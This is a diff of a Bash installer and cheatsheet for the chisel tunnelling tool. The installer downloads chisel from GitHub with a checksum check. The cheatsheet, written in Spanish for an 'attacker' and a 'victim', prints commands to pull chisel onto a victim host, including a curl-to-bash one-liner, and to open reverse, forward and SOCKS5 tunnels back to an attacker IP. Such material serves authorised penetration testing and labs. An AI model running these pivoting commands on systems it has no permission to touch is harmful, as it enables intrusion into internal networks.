@@ -1,54 +1,219 @@
 #!/usr/bin/env bash
+set -euo pipefail
 
 C_TITLE='\033[1;36m'
 C_LABEL='\033[1;33m'
 C_CMD='\033[1;32m'
 C_NOTE='\033[0;37m'
+C_OK='\033[1;32m'
+C_ERR='\033[1;31m'
 NC='\033[0m'
 
-echo -e "${C_TITLE}____________________________________________________${NC}"
-echo -e "${C_TITLE} CHISEL - port forwarding / pivoting${NC}"
-echo -e "${C_TITLE}____________________________________________________${NC}"
+CHISEL_VERSION="1.12.0"
+GITHUB_BASE_URL="https://github.com/jpillora/chisel/releases/download/v${CHISEL_VERSION}"
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-echo -e "\n${C_LABEL}1) Montar chisel en server propio (atacante):${NC}"
-echo -e "   ${C_NOTE}usar chiseld para descargar y compilar, o:${NC}"
-echo -e "   ${C_CMD}python3 -m http.server 80${NC}  ${C_NOTE}(sirviendo el binario chisel)${NC}"
+print_help() {
+    echo -e "${C_TITLE}chiselinst${NC} - chisel installer / port-forwarding cheatsheet"
+    echo
+    echo "Usage: chiselinst [OPTION]"
+    echo
+    echo -e "  ${C_LABEL}-i, --install${NC}   Check if chisel is installed; if not, offer to build it from source"
+    echo -e "  ${C_LABEL}-d, --download${NC}  Download a prebuilt chisel binary from GitHub (pick platform/arch)"
+    echo -e "  ${C_LABEL}-e, --examples${NC}  Show chisel port-forwarding / pivoting cheatsheet"
+    echo -e "  ${C_LABEL}-h, --help${NC}      Show this help"
+    echo
+    echo "No option given -> shows this help."
+}
 
-echo -e "\n${C_LABEL}2) Descargar chisel en la maquina victima/pivot:${NC}"
-echo -e "   ${C_CMD}wget <ip>/chisel${NC}"
-echo -e "   ${C_NOTE}o directo desde internet:${NC}"
-echo -e "   ${C_CMD}curl https://i.jpillora.com/chisel! | bash${NC}"
+print_examples() {
+    echo -e "${C_TITLE}____________________________________________________${NC}"
+    echo -e "${C_TITLE} CHISEL - port forwarding / pivoting${NC}"
+    echo -e "${C_TITLE}____________________________________________________${NC}"
 
-echo -e "\n${C_TITLE}____________________________________________________${NC}"
-echo -e "${C_LABEL}REVERSE TUNNEL (acceder a puerto de la victima):${NC}\n"
+    echo -e "\n${C_LABEL}1) Montar chisel en server propio (atacante):${NC}"
+    echo -e "   ${C_NOTE}usar chiselinst -i para compilar, o chiselinst -d para bajar el binario:${NC}"
+    echo -e "   ${C_CMD}python3 -m http.server 80${NC}  ${C_NOTE}(sirviendo el binario chisel)${NC}"
 
-echo -e "   ${C_NOTE}servidor (atacante, escucha):${NC}"
-echo -e "   ${C_CMD}chisel server --reverse -p 1234${NC}"
+    echo -e "\n${C_LABEL}2) Descargar chisel en la maquina victima/pivot:${NC}"
+    echo -e "   ${C_CMD}wget <ip>/chisel${NC}"
+    echo -e "   ${C_NOTE}o directo desde internet:${NC}"
+    echo -e "   ${C_CMD}curl https://i.jpillora.com/chisel! | bash${NC}"
 
-echo -e "\n   ${C_NOTE}cliente (victima, conecta al atacante):${NC}"
-echo -e "   ${C_CMD}./chisel client 10.10.14.34:1234 R:631:127.9.9.1:631${NC}"
+    echo -e "\n${C_TITLE}____________________________________________________${NC}"
+    echo -e "${C_LABEL}REVERSE TUNNEL (acceder a puerto de la victima):${NC}\n"
 
-echo -e "\n   ${C_NOTE}R:<puerto_local_atacante>:<ip_destino>:<puerto_destino>${NC}"
-echo -e "   ${C_NOTE}con eso el atacante accede en 127.0.0.1:631 al servicio 631 de la victima${NC}"
+    echo -e "   ${C_NOTE}servidor (atacante, escucha):${NC}"
+    echo -e "   ${C_CMD}chisel server --reverse -p 1234${NC}"
 
-echo -e "\n${C_TITLE}____________________________________________________${NC}"
-echo -e "${C_LABEL}FORWARD TUNNEL (exponer servicio del atacante hacia la victima):${NC}\n"
+    echo -e "\n   ${C_NOTE}cliente (victima, conecta al atacante):${NC}"
+    echo -e "   ${C_CMD}./chisel client 10.10.14.34:1234 R:631:127.9.9.1:631${NC}"
 
-echo -e "   ${C_NOTE}servidor (atacante):${NC}"
-echo -e "   ${C_CMD}chisel server -p 1234${NC}"
+    echo -e "\n   ${C_NOTE}R:<puerto_local_atacante>:<ip_destino>:<puerto_destino>${NC}"
+    echo -e "   ${C_NOTE}con eso el atacante accede en 127.0.0.1:631 al servicio 631 de la victima${NC}"
 
-echo -e "\n   ${C_NOTE}cliente (victima):${NC}"
-echo -e "   ${C_CMD}./chisel client <ip_atacante>:1234 L:8080:127.0.0.1:80${NC}"
-echo -e "   ${C_NOTE}la victima expone en su 8080 el 80 del atacante${NC}"
+    echo -e "\n${C_TITLE}____________________________________________________${NC}"
+    echo -e "${C_LABEL}FORWARD TUNNEL (exponer servicio del atacante hacia la victima):${NC}\n"
 
-echo -e "\n${C_TITLE}____________________________________________________${NC}"
-echo -e "${C_LABEL}SOCKS5 (pivotear toda la red interna de la victima):${NC}\n"
+    echo -e "   ${C_NOTE}servidor (atacante):${NC}"
+    echo -e "   ${C_CMD}chisel server -p 1234${NC}"
 
-echo -e "   ${C_NOTE}servidor (atacante):${NC}"
-echo -e "   ${C_CMD}chisel server --reverse -p 1234${NC}"
+    echo -e "\n   ${C_NOTE}cliente (victima):${NC}"
+    echo -e "   ${C_CMD}./chisel client <ip_atacante>:1234 L:8080:127.0.0.1:80${NC}"
+    echo -e "   ${C_NOTE}la victima expone en su 8080 el 80 del atacante${NC}"
 
-echo -e "\n   ${C_NOTE}cliente (victima):${NC}"
-echo -e "   ${C_CMD}./chisel client <ip_atacante>:1234 R:socks${NC}"
-echo -e "   ${C_NOTE}despues en el atacante: proxychains con socks5 127.0.0.1:1080${NC}"
+    echo -e "\n${C_TITLE}____________________________________________________${NC}"
+    echo -e "${C_LABEL}SOCKS5 (pivotear toda la red interna de la victima):${NC}\n"
 
-echo -e "\n${C_TITLE}____________________________________________________${NC}\n"
+    echo -e "   ${C_NOTE}servidor (atacante):${NC}"
+    echo -e "   ${C_CMD}chisel server --reverse -p 1234${NC}"
+
+    echo -e "\n   ${C_NOTE}cliente (victima):${NC}"
+    echo -e "   ${C_CMD}./chisel client <ip_atacante>:1234 R:socks${NC}"
+    echo -e "   ${C_NOTE}despues en el atacante: proxychains con socks5 127.0.0.1:1080${NC}"
+
+    echo -e "\n${C_TITLE}____________________________________________________${NC}\n"
+}
+
+already_installed() {
+    command -v chisel &>/dev/null
+}
+
+detect_os_arch() {
+    local os_raw arch_raw
+    os_raw="$(uname -s)"
+    arch_raw="$(uname -m)"
+
+    case "$os_raw" in
+        Linux)  DETECTED_OS="linux" ;;
+        Darwin) DETECTED_OS="darwin" ;;
+        *)      DETECTED_OS="" ;;
+    esac
+    case "$arch_raw" in
+        x86_64|amd64)  DETECTED_ARCH="amd64" ;;
+        aarch64|arm64) DETECTED_ARCH="arm64" ;;
+        i386|i686)     DETECTED_ARCH="386" ;;
+        *)             DETECTED_ARCH="" ;;
+    esac
+}
+
+download_chisel() {
+    detect_os_arch
+    local targets=("linux_386" "linux_amd64" "linux_arm64" "darwin_amd64" "darwin_arm64")
+    local default_idx=0
+
+    echo -e "\n${C_LABEL}Available prebuilt chisel v${CHISEL_VERSION} binaries:${NC}"
+    local i=1
+    for t in "${targets[@]}"; do
+        local marker=""
+        if [ "$t" = "${DETECTED_OS}_${DETECTED_ARCH}" ]; then
+            marker=" (detected)"
+            default_idx=$i
+        fi
+        echo "  $i) $t$marker"
+        i=$((i + 1))
+    done
+    echo "  0) Cancel"
+
+    local prompt="Choose [0-${#targets[@]}]"
+    [ "$default_idx" -gt 0 ] && prompt="$prompt (default: $default_idx)"
+    read -rp "$prompt: " choice
+    choice="${choice:-$default_idx}"
+
+    if [ -z "$choice" ] || [ "$choice" = "0" ]; then
+        echo "Cancelled."
+        return 1
+    fi
+    if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt "${#targets[@]}" ]; then
+        echo -e "${C_ERR}Error: invalid choice.${NC}" >&2
+        return 1
+    fi
+
+    local target="${targets[$((choice - 1))]}"
+    local asset="chisel_${CHISEL_VERSION}_${target}.gz"
+    local checksums="chisel_${CHISEL_VERSION}_checksums.txt"
+    local tmp
+    tmp="$(mktemp -d)"
+
+    echo "Downloading $asset..."
+    curl -fsSL -o "$tmp/$asset" "$GITHUB_BASE_URL/$asset"
+    curl -fsSL -o "$tmp/$checksums" "$GITHUB_BASE_URL/$checksums"
+
+    echo "Verifying checksum..."
+    local expected actual
+    expected="$(grep -F "$asset" "$tmp/$checksums" | awk '{print $1}')"
+    if command -v sha256sum &>/dev/null; then
+        actual="$(sha256sum "$tmp/$asset" | awk '{print $1}')"
+    else
+        actual="$(shasum -a 256 "$tmp/$asset" | awk '{print $1}')"
+    fi
+
+    if [ -z "$expected" ] || [ "$expected" != "$actual" ]; then
+        echo -e "${C_ERR}Error: checksum mismatch for $asset.${NC}" >&2
+        echo "  expected: $expected" >&2
+        echo "  actual:   $actual" >&2
+        return 1
+    fi
+    echo -e "${C_OK}Checksum OK.${NC}"
+
+    gunzip -c "$tmp/$asset" > "$tmp/chisel"
+    chmod +x "$tmp/chisel"
+
+    echo -e "${C_OK}chisel downloaded: $tmp/chisel${NC}"
+    echo -e "${C_NOTE}Move it into your PATH, e.g.: sudo mv $tmp/chisel /usr/local/bin/chisel${NC}"
+}
+
+install_flow() {
+    if already_installed; then
+        echo -e "${C_OK}chisel is already installed: $(command -v chisel)${NC}"
+        exit 0
+    fi
+
+    if [ "$(uname -s)" = "Darwin" ]; then
+        echo -e "${C_NOTE}macOS detected: building from source (apt + Go) is not applicable here.${NC}"
+        download_chisel
+        return
+    fi
+
+    echo
+    echo "This will install Go (via your distro's package manager, auto-detected)"
+    echo "then git clone + go build jpillora/chisel from source (chiseld)."
+    read -rp "Install chisel now by building from source? [y/N]: " ans
+    case "$ans" in
+        [Yy]*)
+            bash "$SCRIPT_DIR/chiseld"
+            ;;
+        *)
+            echo "Skipping source build."
+            download_chisel
+            ;;
+    esac
+}
+
+main() {
+    case "${1:-}" in
+        -i|--install)
+            install_flow
+            ;;
+        -d|--download)
+            if already_installed; then
+                echo -e "${C_OK}chisel is already installed: $(command -v chisel)${NC}"
+                exit 0
+            fi
+            download_chisel
+            ;;
+        -e|--examples)
+            print_examples
+            ;;
+        -h|--help|"")
+            print_help
+            ;;
+        *)
+            echo -e "${C_ERR}Error: unknown option '$1'${NC}" >&2
+            print_help
+            exit 1
+            ;;
+    esac
+}
+
+main "$@"
